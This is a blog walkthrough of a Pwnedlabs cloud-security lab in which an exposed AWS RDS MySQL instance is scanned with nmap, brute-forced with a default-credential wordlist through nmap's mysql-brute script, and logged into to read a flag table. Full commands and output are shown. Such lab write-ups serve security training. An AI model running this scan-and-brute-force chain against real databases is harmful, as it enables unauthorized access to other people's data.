---
author: Nithissh S
pubDatetime: 2024-02-16
modDatetime: 2024-02-16
title: Pillage Exposed RDS instances - Pwnedlabs walkthrough
slug: pillage-exposed-rds-instances
featured: false
draft: false
tags:
  - Pwnedlabs
  - Cloud Pentest
description:
  As an initial path we have been provided with a RDS instance URL and In this blog, we will see how with a simple hostname we can able to comprise the database 
---


The scenario here is in the backdrop of rising cybersecurity threats, with chatter on Telegram channels hinting at data dumps and Pastebin snippets exposing snippets of configurations, Huge Logistics is taking no chances. They've enlisted your team's expertise to rigorously assess their cloud infrastructure. Armed with a list of IP addresses and endpoints, a lead emerged — an RDS endpoint: `exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com`. Your mission? Dive deep into this endpoint's security, and identify any security issues before threat actors do.

  

### Understand what is RDS

Amazon RDS is defined as a Relation database services in more of distributed way.. Kind of service offering from AWS to simply the setup, operational changes and scaling of application and one thing to remember is Amazon RDS supports PostgreSQL, MySQL, Maria DB, Oracle, SQL Server, and Amazon Aurora
  

## Approaching for a solution 

With the following RDS instance URL: [exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com](https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com "https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com") we will do a simple nmap scan on top 1000 ports and as a result, we can see that port 3306 is open and runs a mysql server ⁸

  

```sh
r4y@DESKTOP-3KBF4H7:/mnt/c/Users/Nithissh$ nmap -sV -Pn --top 1000 -vvv exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-16 21:00 PST
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 21:00
Completed Parallel DNS resolution of 1 host. at 21:00, 0.29s elapsed
DNS resolution of 1 IPs took 0.29s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:00
Scanning exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68) [1000 ports]
Discovered open port 3306/tcp on 16.171.94.68
Completed Connect Scan at 21:01, 42.93s elapsed (1000 total ports)
Initiating Service scan at 21:01
Scanning 1 service on exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Completed Service scan at 21:01, 25.40s elapsed (1 service on 1 host)
NSE: Script scanning 16.171.94.68.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:01
Completed NSE at 21:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:01
Completed NSE at 21:01, 0.35s elapsed
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up, received user-set (0.17s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com
Scanned at 2024-02-16 21:00:26 PST for 69s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT     STATE SERVICE REASON  VERSION
3306/tcp open  mysql?  syn-ack
```

  

Look into banner grabbing through netcat, we found that `mysql_native_password`  is supported and what that means is it is authentication mechanism used in mysql when you enter the password it get converted into some kind of kind hash using a method called password native hashing and later when the user enters the password again it is converted into hash format and compared with the stored hash.. If it is validated and verified, user will get loggedin 

  

```sh
r4y@DESKTOP-3KBF4H7:/mnt/c/Users/Nithissh$ nc exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com 3306
J
8.0.32��
       QD]R<�����bAd;F1B*mysql_native_password2
```

  

We can also do the username and password manually but it is time consuming and so, we are automating it using nmap’s mysql-brute script for that we need to do a similiar setups like firstly need a wordlist and for that we are utilizing seclists and setup the delimiter between of the wordlist because it is in the format of `root:root`  where the nmap script supports if it is in a particular format `root/root` 

  

```sh
r4y@DESKTOP-3KBF4H7:/tmp$  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -O mysql-creds.txt
--2024-02-16 21:30:46--  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 343 [text/plain]
Saving to: ‘mysql-creds.txt’

mysql-creds.txt               100%[=================================================>]     343  --.-KB/s    in 0s

2024-02-16 21:30:46 (51.9 MB/s) - ‘mysql-creds.txt’ saved [343/343]

r4y@DESKTOP-3KBF4H7:/tmp$ sed -i 's/:/\//g' mysql-creds.txt
r4y@DESKTOP-3KBF4H7:/tmp$ cat mysql-creds.txt
root/mysql
root/root
root/chippc
admin/admin
root/
root/nagiosxi
root/usbw
cloudera/cloudera
root/cloudera
root/moves
moves/moves
root/testpw
root/p@ck3tf3nc3
mcUser/medocheck123
root/mktt
root/123
dbuser/123
asteriskuser/amp109
asteriskuser/eLaStIx.asteriskuser.2oo7
root/raspberry
root/openauditrootuserpassword
root/vagrant
root/123qweASD#
```

  

With the nmap, we can bruteforce with the `mysql-brute`  script and additonally you can pass the wordlist which we have edited through `brute.credfile` params.. After nmap scan is completed, we found ou valid credentials for the database which is `dbuser:123`

  

```sh
r4y@DESKTOP-3KBF4H7:/tmp$ nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-16 21:35 PST
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up (0.16s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute:
|   Accounts:
|     dbuser:123 - Valid credentials
|_  Statistics: Performed 23 guesses in 33 seconds, average tps: 0.8

Nmap done: 1 IP address (1 host up) scanned in 33.24 seconds
```

  

In mysql commandline on to your host machine and with the following we can able to connect to the host [`exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com`](https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com "https://exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com") with the username as `dbuser` and our password will be `123`

  

```sh
r4y@DESKTOP-3KBF4H7:/tmp$ mysql -h exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com -u dbuser -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 311539
Server version: 8.0.32 Source distribution

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

  

Let’s check the permissions or grants of `dbuser`  with the following query `SHOW GRANTS FROM “dbuser”;`  where it will show what it has access to and we have access `user_info` database and in the you can enumerate users table or flag as well

  

```sh
mysql> SHOW GRANTS FOR "dbuser"
    -> ;
+-----------------------------------------------------+
| Grants for dbuser@%                                 |
+-----------------------------------------------------+
| GRANT USAGE ON *.* TO `dbuser`@`%`                  |
| GRANT SELECT ON `user_info`.`flag` TO `dbuser`@`%`  |
| GRANT SELECT ON `user_info`.`users` TO `dbuser`@`%` |
+-----------------------------------------------------+
3 rows in set (0.18 sec)
```

  

Let’s change the database by entering query which is `use user_info;`  and once the database is changed, try disclosing the table susing `show tables`

  

```sh
mysql> use user_info;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_user_info |
+---------------------+
| flag                |
| users               |
+---------------------+
2 rows in set (0.18 sec)
```

  

We got our flag with the following query `SELECT * FROM flag`  

  

```sh
mysql> select * from flag
    -> ;
+----------------------------------+
| flag                             |
+----------------------------------+
| e1c342d58b6933b3e0b5078174fd5a62 |
+----------------------------------+
1 row in set (0.17 sec)
```